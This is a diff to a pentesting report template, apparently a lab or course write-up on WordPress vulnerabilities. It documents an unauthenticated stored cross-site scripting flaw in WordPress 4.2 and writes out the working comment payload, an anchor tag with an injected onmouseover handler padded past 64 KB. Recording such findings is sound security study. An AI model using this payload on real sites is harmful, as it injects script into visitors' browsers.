@@ -7,15 +7,17 @@ Time spent: **X** hours spent in total
 
 ## Pentesting Report
 
-### 1. (Required) Vulnerability Name or ID
+### 1. (Required) Unauthenticated Stored Cross-Site Scripting
   - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
+    - Vulnerability types: XSS
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.1
+  - [ ] GIF Walkthrough: <img src='https://github.com/darras4/WP-vs-Kali/blob/main/1.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
   - [ ] Steps to recreate: 
+    - Enter this comment as a text: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a> .
+    - Replace the '[64 kb]' by something that would make the comment larger than 64 kilobytes.
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link 1](https://klikki.fi/wordpress-4-2-core-stored-xss/)
 ### 2. (Required) Authenticated Cross-Site Scripting via Media File Metadata
   - [ ] Summary: 
     - Vulnerability types: XSS
